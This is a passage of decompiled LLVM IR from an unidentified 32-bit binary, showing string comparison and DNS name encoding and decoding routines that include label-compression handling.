  store i32 %v4_8056892, i32* @ecx, align 4
  %v0_805689c = load i32, i32* bitcast (i32** @global_var_805d880.323 to i32*), align 128
  br label %dec_label_pc_80568a2

dec_label_pc_80568a2:                             ; preds = %dec_label_pc_80568bf, %dec_label_pc_8056890
  %v0_80568c56 = phi i32 [ %v0_80568c57, %dec_label_pc_80568bf ], [ 0, %dec_label_pc_8056890 ]
  %v0_80568bf = phi i32 [ %v1_80568bf, %dec_label_pc_80568bf ], [ %arg2, %dec_label_pc_8056890 ]
  %v0_80568c0 = phi i32 [ %v1_80568c0, %dec_label_pc_80568bf ], [ %v4_8056892, %dec_label_pc_8056890 ]
  %v12_80568a2 = icmp eq i32 %v0_80568c0, %v0_80568bf
  %.pre = inttoptr i32 %v0_80568c0 to i8*
  br i1 %v12_80568a2, label %dec_label_pc_80568ba, label %dec_label_pc_80568a6

dec_label_pc_80568a6:                             ; preds = %dec_label_pc_80568a2
  %v2_80568a6 = load i8, i8* %.pre, align 1
  %v3_80568a6 = zext i8 %v2_80568a6 to i32
  %v2_80568a9 = mul nuw nsw i32 %v3_80568a6, 2
  %v3_80568a9 = add i32 %v2_80568a9, %v0_805689c
  %v4_80568a9 = inttoptr i32 %v3_80568a9 to i16*
  %v5_80568a9 = load i16, i16* %v4_80568a9, align 2
  %v6_80568a9 = sext i16 %v5_80568a9 to i32
  %v1_80568ad = inttoptr i32 %v0_80568bf to i8*
  %v2_80568ad = load i8, i8* %v1_80568ad, align 1
  %v3_80568ad = zext i8 %v2_80568ad to i32
  %v2_80568b0 = mul nuw nsw i32 %v3_80568ad, 2
  %v3_80568b0 = add i32 %v2_80568b0, %v0_805689c
  %v4_80568b0 = inttoptr i32 %v3_80568b0 to i16*
  %v5_80568b0 = load i16, i16* %v4_80568b0, align 2
  %v6_80568b0 = sext i16 %v5_80568b0 to i32
  %v2_80568b4 = sub nsw i32 %v6_80568a9, %v6_80568b0
  %v12_80568b4 = icmp eq i32 %v2_80568b4, 0
  store i32 %v2_80568b4, i32* @edx, align 4
  %v1_80568b8 = icmp eq i1 %v12_80568b4, false
  br i1 %v1_80568b8, label %dec_label_pc_80568c3, label %dec_label_pc_80568ba

dec_label_pc_80568ba:                             ; preds = %dec_label_pc_80568a2, %dec_label_pc_80568a6
  %v0_80568c57 = phi i32 [ %v2_80568b4, %dec_label_pc_80568a6 ], [ %v0_80568c56, %dec_label_pc_80568a2 ]
  %v2_80568ba = load i8, i8* %.pre, align 1
  %v3_80568ba = icmp eq i8 %v2_80568ba, 0
  br i1 %v3_80568ba, label %dec_label_pc_80568c3, label %dec_label_pc_80568bf

dec_label_pc_80568bf:                             ; preds = %dec_label_pc_80568ba
  %v1_80568bf = add i32 %v0_80568bf, 1
  %v1_80568c0 = add i32 %v0_80568c0, 1
  store i32 %v1_80568c0, i32* @ecx, align 4
  br label %dec_label_pc_80568a2

dec_label_pc_80568c3:                             ; preds = %dec_label_pc_80568ba, %dec_label_pc_80568a6
  %v0_80568c5 = phi i32 [ %v0_80568c57, %dec_label_pc_80568ba ], [ %v2_80568b4, %dec_label_pc_80568a6 ]
  ret i32 %v0_80568c5

; uselistorder directives
  uselistorder i32 %v1_80568c0, { 1, 0 }
  uselistorder i32 %v0_80568c57, { 1, 0 }
  uselistorder i32 %v2_80568b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80568c0, { 2, 1, 0 }
  uselistorder i32 %v0_80568bf, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80568ba, { 1, 0 }
}

define i32 @function_80568c8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_80568c8:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80568c9 = load i32, i32* @edi, align 4
  %v0_80568ca = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80568d1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80568d1, i32* @edi, align 4
  %v1_80569305 = icmp eq i8* %arg1, null
  br i1 %v1_80569305, label %dec_label_pc_8056939, label %dec_label_pc_8056934.lr.ph

dec_label_pc_8056934.lr.ph:                       ; preds = %dec_label_pc_80568c8
  br label %dec_label_pc_8056934

dec_label_pc_80568d7:                             ; preds = %dec_label_pc_8056934
  %v5_80568dc = call i32 @function_8051474(i8* %v1_8056934, i32 46)
  %v1_80568e6 = icmp eq i32 %v5_80568dc, 0
  br i1 %v1_80568e6, label %dec_label_pc_80568f0, label %dec_label_pc_80568ea

dec_label_pc_80568ea:                             ; preds = %dec_label_pc_80568d7
  %v1_80568ec = load i32, i32* @edi, align 4
  %v2_80568ec = sub i32 %v5_80568dc, %v1_80568ec
  br label %dec_label_pc_80568fe

dec_label_pc_80568f0:                             ; preds = %dec_label_pc_80568d7
  %v0_80568f3 = load i32, i32* @edi, align 4
  %v5_80568f3 = inttoptr i32 %v0_80568f3 to i8*
  %v3_80568f4 = call i32 @function_80514b0(i8* %v5_80568f3)
  br label %dec_label_pc_80568fe

dec_label_pc_80568fe:                             ; preds = %dec_label_pc_80568ea, %dec_label_pc_80568f0
  %v0_8056911 = phi i32 [ %v2_80568ec, %dec_label_pc_80568ea ], [ %v3_80568f4, %dec_label_pc_80568f0 ]
  store i32 %v0_8056911, i32* @esi, align 4
  %v1_80568fe = icmp eq i32 %v0_8056911, 0
  %v3_80568fe = trunc i32 %v0_8056911 to i8
  br i1 %v1_80568fe, label %dec_label_pc_805694d, label %dec_label_pc_8056902

dec_label_pc_8056902:                             ; preds = %dec_label_pc_80568fe
  %v1_8056906 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056906 = sub i32 %arg3, %v1_8056906
  %v1_8056908 = add i32 %v2_8056906, -1
  %v7_8056909 = icmp ult i32 %v0_8056911, %v1_8056908
  %v1_805690b = icmp eq i1 %v7_8056909, false
  br i1 %v1_805690b, label %dec_label_pc_805694d, label %dec_label_pc_805690d

dec_label_pc_805690d:                             ; preds = %dec_label_pc_8056902
  store i32 %arg2, i32* @edx, align 4
  %v4_8056913 = add i32 %v1_8056906, %arg2
  %v5_8056913 = inttoptr i32 %v4_8056913 to i8*
  store i8 %v3_80568fe, i8* %v5_8056913, align 1
  %v0_8056916 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056916 = add i32 %v0_8056916, 1
  %v0_8056918 = load i32, i32* @edx, align 4
  %v2_805691a = add i32 %v1_8056916, %v0_8056918
  %v0_805691c = load i32, i32* @esi, align 4
  %v0_805691d = load i32, i32* @edi, align 4
  %v2_805691f = add i32 %v0_805691c, %v1_8056916
  store i32 %v2_805691f, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_805691a to i16*
  %v7_8056921 = call i32 @function_8051414(i16* %tmp30, i32 %v0_805691d, i32 %v0_805691c)
  %v1_805692d = add i32 %v5_80568dc, 1
  br i1 %v1_80568e6, label %dec_label_pc_8056939, label %dec_label_pc_8056930

dec_label_pc_8056930:                             ; preds = %dec_label_pc_805690d
  store i32 %v1_805692d, i32* @edi, align 4
  %v1_8056930 = icmp eq i32 %v1_805692d, 0
  br i1 %v1_8056930, label %dec_label_pc_8056939, label %dec_label_pc_8056934

dec_label_pc_8056934:                             ; preds = %dec_label_pc_8056934.lr.ph, %dec_label_pc_8056930
  %v0_80568db = phi i32 [ %v4_80568d1, %dec_label_pc_8056934.lr.ph ], [ %v1_805692d, %dec_label_pc_8056930 ]
  %v1_8056934 = inttoptr i32 %v0_80568db to i8*
  %v2_8056934 = load i8, i8* %v1_8056934, align 1
  %v3_8056934 = icmp eq i8 %v2_8056934, 0
  %v1_8056937 = icmp eq i1 %v3_8056934, false
  br i1 %v1_8056937, label %dec_label_pc_80568d7, label %dec_label_pc_8056939

dec_label_pc_8056939:                             ; preds = %dec_label_pc_8056930, %dec_label_pc_8056934, %dec_label_pc_805690d, %dec_label_pc_80568c8
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_805694d, label %dec_label_pc_8056940

dec_label_pc_8056940:                             ; preds = %dec_label_pc_8056939
  %v1_8056944 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056944 = add i32 %v1_8056944, %arg2
  %v3_8056944 = inttoptr i32 %v2_8056944 to i8*
  store i8 0, i8* %v3_8056944, align 1
  %v0_8056948 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056948 = add i32 %v0_8056948, 1
  br label %dec_label_pc_8056950

dec_label_pc_805694d:                             ; preds = %dec_label_pc_8056902, %dec_label_pc_80568fe, %dec_label_pc_8056939
  br label %dec_label_pc_8056950

dec_label_pc_8056950:                             ; preds = %dec_label_pc_8056940, %dec_label_pc_805694d
  %storemerge3 = phi i32 [ %v1_8056948, %dec_label_pc_8056940 ], [ -1, %dec_label_pc_805694d ]
  store i32 %v0_80568ca, i32* @esi, align 4
  store i32 %v0_80568c9, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_8056934, { 1, 0 }
  uselistorder i32 %v1_805692d, { 0, 2, 1 }
  uselistorder i32 %v0_805691c, { 1, 0 }
  uselistorder i1 %v1_80568e6, { 1, 0 }
  uselistorder i32 %v5_80568dc, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_80514b0, { 6, 0, 1, 7, 8, 3, 4, 5, 2 }
  uselistorder i32 (i8*, i32)* @function_8051474, { 2, 3, 4, 0, 1 }
  uselistorder i32 46, { 2, 5, 0, 6, 1, 3, 4 }
  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 12, 13, 14, 4 }
  uselistorder label %dec_label_pc_8056950, { 1, 0 }
  uselistorder label %dec_label_pc_805694d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056939, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8056934, { 1, 0 }
  uselistorder label %dec_label_pc_80568fe, { 1, 0 }
}

define i32 @function_8056958(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056958:
  %ebp.global-to-local = alloca i32, align 4
  %v0_805695a = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8056963 = icmp eq i32 %arg1, 0
  br i1 %v4_8056963, label %dec_label_pc_8056a27, label %dec_label_pc_805696e

dec_label_pc_805696e:                             ; preds = %dec_label_pc_8056958
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_8056a0c2740 = add i32 %arg2, %arg1
  %v3_8056a0c2841 = inttoptr i32 %v2_8056a0c2740 to i8*
  %v4_8056a0c2942 = load i8, i8* %v3_8056a0c2841, align 1
  %v1_8056a103144 = icmp eq i8 %v4_8056a0c2942, 0
  %v1_8056a123245 = icmp eq i1 %v1_8056a103144, false
  br i1 %v1_8056a123245, label %dec_label_pc_805697c.lr.ph, label %dec_label_pc_8056a18.thread62

dec_label_pc_8056a18.thread62:                    ; preds = %dec_label_pc_805696e
  br label %bb63

dec_label_pc_805697c:                             ; preds = %dec_label_pc_805697c.lr.ph, %dec_label_pc_8056995
  %v0_8056986 = phi i32 [ %v0_8056986.pre, %dec_label_pc_805697c.lr.ph ], [ %v4_80569a0, %dec_label_pc_8056995 ]
  %v8_805697c38 = phi i1 [ %v8_805697c3350, %dec_label_pc_805697c.lr.ph ], [ true, %dec_label_pc_8056995 ]
  %v5_8056a0c37.in = phi i8 [ %v5_8056a0c3049.in, %dec_label_pc_805697c.lr.ph ], [ %v4_8056a0c, %dec_label_pc_8056995 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_805697c.lr.ph ], [ 0, %dec_label_pc_8056995 ]
  %v0_805698335 = phi i32 [ %v0_8056983.ph46, %dec_label_pc_805697c.lr.ph ], [ %v2_80569af, %dec_label_pc_8056995 ]
  %v5_8056a0c37 = zext i8 %v5_8056a0c37.in to i32
  %v1_8056983 = add i32 %v0_805698335, 1
  store i32 %v1_8056983, i32* @esi, align 4
  %v3_8056986 = select i1 %v8_805697c38, i32 2, i32 1
  %v4_8056986 = add i32 %v3_8056986, %v0_8056986
  store i32 %v4_8056986, i32* %ebp.global-to-local, align 4
  %v1_8056989 = and i32 %v5_8056a0c37, 192
  %v6_805698e = icmp eq i32 %v1_8056989, 192
  %v1_8056993 = icmp eq i1 %v6_805698e, false
  br i1 %v1_8056993, label %dec_label_pc_80569b8, label %dec_label_pc_8056995

dec_label_pc_8056995:                             ; preds = %dec_label_pc_805697c
  %v4_80569a0 = add i32 %v3_8056986, %v4_8056986
  store i32 %v4_80569a0, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_8056a0c37.in, 64
  %v1_80569a3 = zext i8 %tmp to i32
  %v2_80569a6 = add i32 %v1_8056983, %arg1
  %v3_80569a6 = inttoptr i32 %v2_80569a6 to i8*
  %v4_80569a6 = load i8, i8* %v3_80569a6, align 1
  %v5_80569a6 = zext i8 %v4_80569a6 to i32
  %v2_80569aa = mul nuw nsw i32 %v1_80569a3, 256
  %v2_80569af = or i32 %v5_80569a6, %v2_80569aa
  store i32 %v2_80569af, i32* @edx, align 4
  store i32 %v1_80569d5.ph47, i32* @ecx, align 4
  %v2_8056a0c = add i32 %v2_80569af, %arg1
  %v3_8056a0c = inttoptr i32 %v2_8056a0c to i8*
  %v4_8056a0c = load i8, i8* %v3_8056a0c, align 1
  %v1_8056a10 = icmp eq i8 %v4_8056a0c, 0
  %v1_8056a12 = icmp eq i1 %v1_8056a10, false
  br i1 %v1_8056a12, label %dec_label_pc_805697c, label %dec_label_pc_8056a18.thread

dec_label_pc_8056a18.thread:                      ; preds = %dec_label_pc_8056995
  br label %bb

dec_label_pc_80569b8:                             ; preds = %dec_label_pc_805697c
  %v2_80569b8 = add i32 %v5_8056a0c37, %v1_80569d5.ph47
  %v1_80569c1 = add i32 %v2_80569b8, 1
  store i32 %v1_80569c1, i32* @edi, align 4
  %v10_80569c2 = icmp ult i32 %v1_80569c1, %arg4
  %v1_80569c6 = icmp eq i1 %v10_80569c2, false
  br i1 %v1_80569c6, label %dec_label_pc_8056a27, label %dec_label_pc_80569c8

dec_label_pc_80569c8:                             ; preds = %dec_label_pc_80569b8
  %v2_80569ce = add i32 %v1_8056983, %arg1
  %v2_80569d5 = add i32 %v1_80569d5.ph47, %arg3
  %v3_80569d8 = inttoptr i32 %v2_80569d5 to i16*
  %v4_80569d8 = call i32 @function_8051414(i16* %v3_80569d8, i32 %v2_80569ce, i32 %v5_8056a0c37)
  %v0_80569e0 = load i32, i32* @esi, align 4
  %v2_80569e0 = add i32 %v0_80569e0, %v5_8056a0c37
  store i32 %v2_80569e0, i32* @edx, align 4
  br i1 %v8_805697c38, label %dec_label_pc_80569ec, label %dec_label_pc_80569ea

dec_label_pc_80569ea:                             ; preds = %dec_label_pc_80569c8
  %v0_80569ea = load i32, i32* %ebp.global-to-local, align 4
  %v2_80569ea = add i32 %v0_80569ea, %v5_8056a0c37
  store i32 %v2_80569ea, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80569ec

dec_label_pc_80569ec:                             ; preds = %dec_label_pc_80569c8, %dec_label_pc_80569ea
  %v4_8056a03 = add i32 %v2_80569b8, %arg3
  %v5_8056a03 = inttoptr i32 %v4_8056a03 to i8*
  store i8 46, i8* %v5_8056a03, align 1
  %v0_8056a06.pre = load i32, i32* @edi, align 4
  %v1_8056a0c.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8056a06.pre, i32* @ecx, align 4
  %v2_8056a0c27 = add i32 %v1_8056a0c.pre.pre, %arg1
  %v3_8056a0c28 = inttoptr i32 %v2_8056a0c27 to i8*
  %v4_8056a0c29 = load i8, i8* %v3_8056a0c28, align 1
  %v1_8056a1031 = icmp eq i8 %v4_8056a0c29, 0
  %v1_8056a1232 = icmp eq i1 %v1_8056a1031, false
  %v8_805697c33 = icmp eq i8 %stack_var_-17.136, 0
  %v0_8056986.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_8056a1232, label %dec_label_pc_805697c.lr.ph, label %dec_label_pc_8056a18

dec_label_pc_805697c.lr.ph:                       ; preds = %dec_label_pc_80569ec, %dec_label_pc_805696e
  %v0_8056986.pre = phi i32 [ 0, %dec_label_pc_805696e ], [ %v0_8056986.pre.pre, %dec_label_pc_80569ec ]
  %v8_805697c3350 = phi i1 [ false, %dec_label_pc_805696e ], [ %v8_805697c33, %dec_label_pc_80569ec ]
  %v5_8056a0c3049.in = phi i8 [ %v4_8056a0c2942, %dec_label_pc_805696e ], [ %v4_8056a0c29, %dec_label_pc_80569ec ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_805696e ], [ %stack_var_-17.136, %dec_label_pc_80569ec ]
  %v1_80569d5.ph47 = phi i32 [ 0, %dec_label_pc_805696e ], [ %v0_8056a06.pre, %dec_label_pc_80569ec ]
  %v0_8056983.ph46 = phi i32 [ %arg2, %dec_label_pc_805696e ], [ %v1_8056a0c.pre.pre, %dec_label_pc_80569ec ]
  br label %dec_label_pc_805697c

dec_label_pc_8056a18:                             ; preds = %dec_label_pc_80569ec
  br i1 %v8_805697c33, label %bb, label %bb63

bb:                                               ; preds = %dec_label_pc_8056a18.thread, %dec_label_pc_8056a18
  %v0_8056a1d61 = phi i32 [ %v4_80569a0, %dec_label_pc_8056a18.thread ], [ %v0_8056986.pre.pre, %dec_label_pc_8056a18 ]
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_8056a18.thread62, %dec_label_pc_8056a18, %bb
  %v0_8056a1d60 = phi i32 [ %v0_8056a1d61, %bb ], [ %v0_8056986.pre.pre, %dec_label_pc_8056a18 ], [ 0, %dec_label_pc_8056a18.thread62 ]
  %tmp64 = phi i32 [ 2, %bb ], [ 1, %dec_label_pc_8056a18 ], [ 1, %dec_label_pc_8056a18.thread62 ]
  %v4_8056a1f = add i32 %tmp64, %v0_8056a1d60
  br label %dec_label_pc_8056a27

dec_label_pc_8056a27:                             ; preds = %dec_label_pc_80569b8, %dec_label_pc_8056958, %bb63
  %storemerge = phi i32 [ %v4_8056a1f, %bb63 ], [ -1, %dec_label_pc_8056958 ], [ -1, %dec_label_pc_80569b8 ]
  store i32 %v0_805695a, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80569d5.ph47, { 2, 1, 0 }
  uselistorder i32 %v0_8056986.pre.pre, { 1, 2, 0 }
  uselistorder i1 %v8_805697c33, { 1, 0 }
  uselistorder i8 %v4_8056a0c, { 1, 0 }
  uselistorder i32 %v2_80569af, { 0, 2, 1 }
  uselistorder i32 %v4_80569a0, { 0, 2, 1 }
  uselistorder i32 %v5_8056a0c37, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 1, { 1, 26, 27, 2, 28, 24, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 3, 4, 23, 25, 5 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @function_8051414, { 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14, 16, 17, 2, 3, 4, 15 }
  uselistorder i32* @edi, { 2, 134, 135, 20, 136, 137, 138, 19, 139, 140, 3, 141, 0, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 22, 5, 4, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 157, 6, 158, 7, 159, 160, 161, 162, 167, 168, 1, 163, 164, 165, 166, 169, 170, 171, 172, 8, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 64, 9, 65, 66, 67, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 228, 41, 42, 68, 69, 114, 70, 71, 72, 73, 74, 75, 76, 77, 78, 10, 79, 80, 81, 82, 83, 84, 85, 229, 230, 11, 231, 232, 12, 235, 236, 237, 21, 238, 239, 250, 43, 44, 45, 46, 47, 48, 49, 56, 13, 57, 58, 254, 264, 265, 266, 267, 268, 255, 256, 257, 258, 259, 260, 261, 262, 263, 215, 216, 217, 218, 219, 220, 221, 222, 14, 223, 224, 225, 226, 227, 269, 270, 15, 271, 272, 273, 274, 275, 276, 277, 124, 125, 126, 127, 128, 86, 87, 16, 88, 213, 214, 252, 253, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 17, 113, 50, 51, 52, 99, 18, 100, 101, 246, 247, 248, 249, 23, 24, 25, 26, 233, 234, 59, 60, 132, 133, 118, 119, 244, 245, 211, 212, 251, 240, 241, 242, 243, 53, 54, 55, 61, 62, 63, 115, 116, 117, 120, 121, 122, 123, 129, 130, 131 }
  uselistorder i32 256, { 1, 4, 2, 3, 5, 6, 7, 8, 9, 45, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 52, 21, 44, 22, 23, 24, 25, 26, 40, 41, 27, 42, 46, 50, 28, 29, 0, 48, 49, 43, 30, 31, 32, 33, 34, 35, 36, 37, 38, 47, 51, 39 }
  uselistorder i8 64, { 0, 3, 4, 1, 5, 6, 2, 7 }
  uselistorder i1 true, { 1, 3, 2, 0 }
  uselistorder i32* @edx, { 8, 351, 352, 353, 354, 355, 356, 357, 358, 9, 359, 360, 361, 362, 363, 19, 3, 366, 364, 365, 2, 367, 368, 369, 370, 371, 372, 373, 374, 21, 22, 23, 24, 25, 375, 376, 377, 378, 379, 380, 381, 387, 382, 383, 384, 385, 386, 4, 20, 388, 389, 390, 391, 284, 285, 392, 393, 394, 286, 287, 288, 289, 290, 396, 398, 399, 401, 400, 5, 402, 403, 404, 405, 452, 10, 26, 291, 292, 331, 293, 294, 295, 332, 296, 297, 298, 453, 454, 455, 456, 11, 457, 458, 333, 460, 461, 0, 27, 462, 407, 465, 466, 471, 470, 463, 28, 477, 487, 12, 488, 489, 490, 491, 492, 493, 478, 479, 480, 481, 482, 483, 484, 13, 485, 486, 475, 476, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 14, 445, 446, 447, 448, 449, 450, 451, 474, 494, 495, 497, 334, 335, 1, 496, 299, 300, 301, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 6, 317, 318, 18, 319, 320, 302, 321, 15, 322, 323, 325, 16, 326, 327, 328, 329, 330, 29, 17, 324, 464, 336, 337, 459, 473, 350, 467, 395, 472, 397, 338, 339, 406, 468, 469, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 340, 341, 342, 343, 344, 345, 346, 347, 348, 7, 349, 498 }
  uselistorder i32* @esi, { 165, 166, 167, 168, 169, 170, 35, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 36, 40, 45, 9, 7, 46, 47, 48, 49, 50, 51, 191, 10, 192, 193, 197, 194, 195, 196, 204, 198, 199, 200, 201, 202, 203, 205, 206, 207, 208, 209, 210, 211, 11, 8, 212, 213, 214, 215, 216, 12, 32, 217, 218, 219, 220, 221, 222, 13, 223, 224, 225, 226, 227, 228, 14, 229, 230, 231, 232, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 15, 91, 92, 233, 234, 235, 236, 16, 17, 237, 18, 238, 239, 240, 19, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 1, 251, 252, 253, 254, 255, 256, 257, 258, 52, 53, 54, 275, 276, 277, 278, 20, 21, 151, 93, 94, 95, 96, 0, 97, 156, 157, 279, 280, 39, 281, 282, 283, 291, 292, 293, 294, 284, 289, 290, 55, 56, 57, 58, 74, 75, 76, 2, 77, 78, 79, 59, 60, 61, 62, 306, 315, 22, 316, 317, 310, 311, 312, 313, 314, 307, 308, 309, 259, 260, 261, 262, 263, 264, 265, 3, 266, 267, 268, 269, 23, 270, 37, 271, 272, 273, 274, 318, 321, 322, 325, 326, 327, 328, 158, 159, 160, 161, 162, 152, 153, 154, 295, 24, 296, 297, 98, 25, 99, 38, 33, 323, 324, 155, 319, 320, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 27, 111, 4, 113, 114, 115, 116, 26, 117, 118, 112, 119, 120, 121, 122, 5, 123, 124, 125, 126, 127, 128, 34, 28, 129, 130, 29, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 30, 148, 149, 150, 31, 63, 131, 6, 132, 133, 285, 286, 287, 288, 298, 299, 300, 301, 302, 303, 41, 42, 43, 44, 304, 305, 163, 164, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 80, 329 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8056a27, { 2, 0, 1 }
  uselistorder label %bb63, { 2, 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_80569ec, { 1, 0 }
}

define i32 @function_8056a30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8056a30:
  %v1_8056a3e = icmp eq i32 %arg1, 0
  br i1 %v1_8056a3e, label %dec_label_pc_8056a6d, label %dec_label_pc_8056a5e.preheader

dec_label_pc_8056a5e.preheader:                   ; preds = %dec_label_pc_8056a30
  store i32 %arg2, i32* @ecx, align 4
  %v2_8056a5e10 = add i32 %arg2, %arg1
  %v3_8056a5e11 = inttoptr i32 %v2_8056a5e10 to i8*
  %v4_8056a5e12 = load i8, i8* %v3_8056a5e11, align 1
  %v1_8056a6214 = add i32 %arg2, 1
  %v1_8056a6515 = icmp eq i8 %v4_8056a5e12, 0
  %v1_8056a6716 = icmp eq i1 %v1_8056a6515, false
  br i1 %v1_8056a6716, label %dec_label_pc_8056a4d, label %dec_label_pc_8056a69

dec_label_pc_8056a44:                             ; preds = %dec_label_pc_8056a4d
  %v1_8056a44 = add i32 %v0_8056a4417, 2
  br label %dec_label_pc_8056a69

dec_label_pc_8056a4d:                             ; preds = %dec_label_pc_8056a5e.preheader, %dec_label_pc_8056a5e
  %v1_8056a6219 = phi i32 [ %v1_8056a62, %dec_label_pc_8056a5e ], [ %v1_8056a6214, %dec_label_pc_8056a5e.preheader ]
  %v5_8056a5e18.in = phi i8 [ %v4_8056a5e, %dec_label_pc_8056a5e ], [ %v4_8056a5e12, %dec_label_pc_8056a5e.preheader ]
  %v0_8056a4417 = phi i32 [ %v2_8056a5b, %dec_label_pc_8056a5e ], [ %arg2, %dec_label_pc_8056a5e.preheader ]
  %v5_8056a5e18 = zext i8 %v5_8056a5e18.in to i32
  %v1_8056a4f = and i32 %v5_8056a5e18, 192
  %v6_8056a54 = icmp eq i32 %v1_8056a4f, 192
  %v2_8056a5b = add i32 %v5_8056a5e18, %v1_8056a6219
  br i1 %v6_8056a54, label %dec_label_pc_8056a44, label %dec_label_pc_8056a5e

dec_label_pc_8056a5e:                             ; preds = %dec_label_pc_8056a4d
  store i32 %v2_8056a5b, i32* @ecx, align 4
  %v2_8056a5e = add i32 %v2_8056a5b, %arg1
  %v3_8056a5e = inttoptr i32 %v2_8056a5e to i8*
  %v4_8056a5e = load i8, i8* %v3_8056a5e, align 1
  %v1_8056a62 = add i32 %v2_8056a5b, 1
  %v1_8056a65 = icmp eq i8 %v4_8056a5e, 0
  %v1_8056a67 = icmp eq i1 %v1_8056a65, false
  br i1 %v1_8056a67, label %dec_label_pc_8056a4d, label %dec_label_pc_8056a69

dec_label_pc_8056a69:                             ; preds = %dec_label_pc_8056a5e.preheader, %dec_label_pc_8056a5e, %dec_label_pc_8056a44
  %v0_8056a69 = phi i32 [ %v1_8056a44, %dec_label_pc_8056a44 ], [ %v1_8056a6214, %dec_label_pc_8056a5e.preheader ], [ %v1_8056a62, %dec_label_pc_8056a5e ]
  %v2_8056a6b = sub i32 %v0_8056a69, %arg2
  br label %dec_label_pc_8056a6d

